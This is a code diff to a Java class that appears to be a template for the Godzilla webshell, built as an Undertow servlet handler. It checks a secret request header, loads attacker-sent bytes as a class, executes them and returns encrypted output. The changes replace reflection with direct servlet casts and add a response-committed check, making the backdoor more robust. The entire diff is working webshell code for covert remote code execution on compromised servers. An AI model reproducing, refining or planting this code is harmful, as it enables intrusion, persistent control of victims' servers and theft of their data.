@@ -5,6 +5,8 @@ import java.io.PrintStream;
 import java.io.PrintWriter;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
 
 /**
  * Godzilla HW UndertowServletHandler 模板（JAVA_AES_RAW_BASE64）。
@@ -46,7 +48,7 @@ public class GodzillaHwUndertowServletHandlerRawBase64 extends ClassLoader {
 
     @SuppressWarnings("all")
     private boolean run(Object request, Object response) throws Exception {
-        String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
+        String value = ((HttpServletRequest) request).getHeader(headerName);
         if (value == null || !value.contains(headerValue)) {
             return false;
         }
@@ -56,7 +58,10 @@ public class GodzillaHwUndertowServletHandlerRawBase64 extends ClassLoader {
             payload = this.defineClass(data, 0, data.length);
             return true;
         }
-        PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
+        if (((HttpServletResponse) response).isCommitted()) {
+            return true;
+        }
+        PrintWriter writer = ((HttpServletResponse) response).getWriter();
         try {
             byte[] result = execute(request, data);
             writer.write(md5.substring(0, 16));
@@ -83,7 +88,7 @@ public class GodzillaHwUndertowServletHandlerRawBase64 extends ClassLoader {
 
     @SuppressWarnings("all")
     private static byte[] readBody(Object request) throws Exception {
-        java.io.InputStream inputStream = (java.io.InputStream) request.getClass().getMethod("getInputStream").invoke(request);
+        java.io.InputStream inputStream = ((HttpServletRequest) request).getInputStream();
         ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
         byte[] buffer = new byte[8192];
         int read;
